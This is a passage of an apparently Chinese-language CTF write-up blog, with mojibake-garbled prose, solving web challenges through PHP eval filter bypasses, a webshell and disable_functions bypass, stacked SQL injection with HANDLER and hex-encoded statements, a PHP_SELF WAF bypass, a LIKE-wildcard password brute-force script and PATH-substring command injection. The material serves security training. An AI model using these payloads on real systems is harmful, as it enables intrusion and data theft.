class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€é“æ— å‚RCEï¼Œå‘ç°|å’Œ^è¢«è¿‡æ»¤ï¼Œä¸èƒ½ç”¨å¼‚æˆ–</p>
<p>æŸ¥çœ‹æ‰€æœ‰æœªè¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;[/!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]&quot;</span></span><br><span class="line"></span><br><span class="line">printable_chars = <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> printable_chars:</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> re.search(regex, <span class="built_in">chr</span>(char)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char), end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717141939712.png" alt="image-20240717141939712"></p>
<p>è€ƒè™‘ä½¿ç”¨è‡ªå¢</p>
<p>é¦–å…ˆï¼Œåœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸º<code>Array</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_</span>); <span class="comment">//Array</span></span><br></pre></td></tr></table></figure>

<p>åŸºç¡€è¯­æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$_</span> = [].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$_</span>[<span class="number">0</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$___</span>= <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//P</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//P</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$___</span>;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="comment">//POS</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="comment">//POST</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>](<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]);</span><br><span class="line"><span class="comment">//$&#123;$__&#125;æœ€ç»ˆè§£æä¸º$_POST</span></span><br><span class="line"><span class="comment">//[&#x27;_&#x27;]å’Œ[&#x27;__&#x27;]æ˜¯ä¼ å…¥çš„å€¼</span></span><br><span class="line"></span><br><span class="line">rce = <span class="variable">$_</span>=%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>%<span class="number">20</span>=%<span class="number">20</span><span class="variable">$_</span>%<span class="number">5</span>B0%<span class="number">5</span>D;<span class="variable">$___</span>=%<span class="number">20</span><span class="string">&#x27;_&#x27;</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>%<span class="number">20</span>=%<span class="number">20</span><span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>.=<span class="variable">$___</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$__</span>.=<span class="variable">$_</span>;<span class="keyword">echo</span>%<span class="number">20</span><span class="variable">$__</span>;<span class="variable">$$__</span>%<span class="number">5</span>B<span class="string">&#x27;_&#x27;</span>%<span class="number">5</span>D(<span class="variable">$$__</span>%<span class="number">5</span>B<span class="string">&#x27;__&#x27;</span>%<span class="number">5</span>D);&amp;_=system&amp;__=ls</span><br><span class="line"><span class="comment">//è¿‡ä¸€éurlç¼–ç ï¼Œå¹¶ä¼ å…¥systemå’Œlsä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717150716468.png" alt="image-20240717150716468"></p>
<p>å¾—å°è¯•ç¼©å‡ï¼Œä½¿ç”¨CHr</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717151653606.png" alt="image-20240717151653606"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]._;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_1</span>.++<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">//CHr</span></span><br><span class="line"><span class="comment">// echo $_(71);</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>(<span class="number">71</span>).<span class="variable">$_</span>(<span class="number">69</span>).<span class="variable">$_</span>(<span class="number">84</span>); <span class="comment">//åˆ©ç”¨CHræ‹¼æ¥ è®©$_=_GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]); <span class="comment">//$_GET[1]($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>urlç¼–ç </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152317171.png" alt="image-20240717152317171"></p>
<p>ç„¶åå°±ã€‚ã€‚ã€‚</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152446580.png" alt="image-20240717152446580"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717152503567.png" alt="image-20240717152503567"></p>
<h2 id="CISCN-2023-è¥¿å—-do-you-like-read"><a href="#CISCN-2023-è¥¿å—-do-you-like-read" class="headerlink" title="[CISCN 2023 è¥¿å—]do_you_like_read"></a>[CISCN 2023 è¥¿å—]do_you_like_read</h2><p>è§£æ³•ä¸€ï¼š</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718092743965.png" alt="image-20240718092743965"></p>
<p>å‘ç°å­˜åœ¨åé¢å¹¶ä¸”æœ‰ä¸ä¹‹å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718092819389.png" alt="image-20240718092819389"></p>
<p>å¯¹ç€åé—¨æ–‡ä»¶æ”¹è·¯å¾„å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093332120.png" alt="image-20240718093332120">&#x2F;var&#x2F;wwwç›®å½•æ— å›æ˜¾å¯ä»¥è€ƒè™‘appç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28157/bootstrap/test/bypass_disablefunc.php?cmd=env&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093403071.png" alt="image-20240718093403071"></p>
<p>è§£æ³•äºŒï¼š</p>
<p>å°†phpç­‰åç¼€æ”¹æˆjpgç»“å°¾</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093739882.png" alt="image-20240718093739882"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093830548.png" alt="image-20240718093830548"></p>
<p>æ ¹æ®æºç ä¸­çš„è·¯å¾„ç›´æ¥å°è¯•è®¿é—®webshell</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718093950170.png" alt="image-20240718093950170"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094058734.png" alt="image-20240718094058734"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094128030.png" alt="image-20240718094128030"></p>
<p>è§£æ³•ä¸‰ï¼š</p>
<p>å‘ç°å¯èƒ½å­˜åœ¨sqlæ³¨å…¥çš„æ¼æ´ç‚¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094554591.png" alt="image-20240718094554591"></p>
<p>ç›´æ¥è·‘sqlmap</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094549834.png" alt="image-20240718094549834"></p>
<p>â€“os-shellç›´æ¥çœ‹ç¯å¢ƒå˜é‡å³å¯</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718094644388.png" alt="image-20240718094644388"></p>
<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è”åˆæŸ¥è¯¢çš„æ—¶å€™å‘ç°å­˜åœ¨è¿‡æ»¤</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240718102729369.png" alt="image-20240718102729369"></p>
<ul>
<li>ç»•è¿‡å§¿åŠ¿1ï¼šåå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç»•è¿‡å§¿åŠ¿2ï¼šä½¿ç”¨handlerå‡½æ•°æ›¿æ¢</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ‰“å¼€ä¸€ä¸ªè¡¨çš„handler</span></span><br><span class="line">HANDLER table_name <span class="keyword">OPEN</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¯»å–ä¸‹ä¸€ä¸ªç´¢å¼•æ¡ç›®</span></span><br><span class="line">HANDLER table_name READ NEXT;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å…³é—­handler</span></span><br><span class="line">HANDLER table_name <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span></span><br></pre></td></tr></table></figure>

<h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>åŒ…å«utils.phpæ–‡ä»¶ï¼Œå°è¯•è¯·æ±‚</p>
<p>ä½†æ˜¯æœ‰waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨%0aç»•è¿‡ï¼Œ%a0 æ˜¯ URL ç¼–ç ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä¸€ä¸ªéæ‰“å°å­—ç¬¦ï¼ˆNo-Break Spaceï¼‰ã€‚åœ¨ PHP ä¸­ï¼Œéæ‰“å°å­—ç¬¦é€šå¸¸ä¼šè¢«å¿½ç•¥ã€‚æ‰€ä»¥ï¼Œ&#x2F;utils.php&#x2F;%a0 å®é™…ä¸Šè¢« PHP è§£æä¸º &#x2F;utils.php&#x2F;ã€‚</p>
<p><strong>%a0çš„ä½œç”¨è§£æ</strong>å‚è€ƒåˆ«çš„å¸ˆå‚…</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718111306192.png" alt="image-20240718111306192"></p>
<p>å› æ­¤æ„é€ å‡ºpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/utils.php/%a0</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€å±‚waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ¯”è¾ƒç®€å•</p>
<p>ç”¨<strong>show[source</strong>æˆ–è€…<strong>show.source</strong>æˆ–è€…<strong>show+source</strong>ç»•è¿‡</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/utils.php/%a0?show[source</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718111508372.png" alt="image-20240718111508372"></p>
<h2 id="web3-è«è´Ÿå©µå¨Ÿ"><a href="#web3-è«è´Ÿå©µå¨Ÿ" class="headerlink" title="web3_è«è´Ÿå©µå¨Ÿ"></a>web3_è«è´Ÿå©µå¨Ÿ</h2><p><em><strong>çšæ´ä¸€å¹´æƒŸæ­¤å¤œï¼Œè«æ•™å®¹æ˜“è´Ÿå©µå¨Ÿ</strong></em> </p>
<p>hintï¼šç¯å¢ƒå˜é‡ +linuxå­—ç¬¦ä¸²æˆªå– + é€šé…ç¬¦</p>
<p>fuzzä¸€ä¸‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720135211671.png" alt="image-20240720135211671"></p>
<p>f12çœ‹åˆ°æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æ³¨æ„ï¼šæ­£å¼ä¸Šçº¿è¯·åˆ é™¤æ³¨é‡Šå†…å®¹ï¼ --&gt;</span><br><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>likeæœ‰ä¸¤ä¸ªé€šé…ç¬¦<code>%</code>å’Œ<code>_</code>ï¼Œè¿™é‡Œæ²¡æœ‰è¿‡æ»¤<code>_</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦çš„ä»»æ„å­—ç¬¦ä¸²</span><br><span class="line">_ï¼ˆä¸‹åˆ’çº¿ï¼‰è¡¨ç¤ºä»»ä½•å•ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>å°è¯•ä½¿ç”¨é€šé…ç¬¦åˆ¤æ–­ä½æ•°</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720140025488.png" alt="image-20240720140025488"></p>
<p>æ ¹æ®è¿™ä¸ªé€»è¾‘å°±å¯ä»¥é€ä¸ªçˆ†ç ´å¯†ç äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">url = <span class="string">&#x27;https://cf189981-52d3-496b-9660-865ce7b82d8e.challenge.ctf.show/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;i = &#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>),end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        password = pwd + j + (<span class="number">31</span> - i) * <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:password&#125;</span><br><span class="line">        r = requests.post(url,data=data,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">             pwd += j</span><br><span class="line">             <span class="built_in">print</span>(pwd)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240720143555477.png" alt="image-20240720143555477"></p>
<p>è¿›å»åå°±æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720143618297.png" alt="image-20240720143618297"></p>
<p>å°å†™å­—æ¯å…¨éƒ¨è¢«è¿‡æ»¤ï¼Œæƒ³åˆ°å¯ä»¥ç”¨ç¯å¢ƒä¾¿åˆ©PATHè¿›è¡Œå‘½ä»¤æ„é€ ï¼Œç”¨è‡ªå·±çš„vpsæµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144324173.png" alt="image-20240720144324173"></p>
<blockquote>
<p>ls</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144530125.png" alt="image-20240720144530125"></p>
<p>æ²¡æœ‰c tï¼Œå¯ä»¥ç”¨nlæ¥è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.???</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144642055.png" alt="image-20240720144642055"></p>
<h2 id="web2-æ•…äººå¿ƒ"><a href="#web2-æ•…äººå¿ƒ" class="headerlink" title="web2_æ•…äººå¿ƒ"></a>web2_æ•…äººå¿ƒ</h2><p><em><strong>ä¸‰äº”å¤œä¸­æ–°æœˆè‰²ï¼ŒäºŒåƒé‡Œå¤–æ•…äººå¿ƒ</strong></em></p>
<p>å­˜åœ¨ä¸€ä¸ªrobots.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span 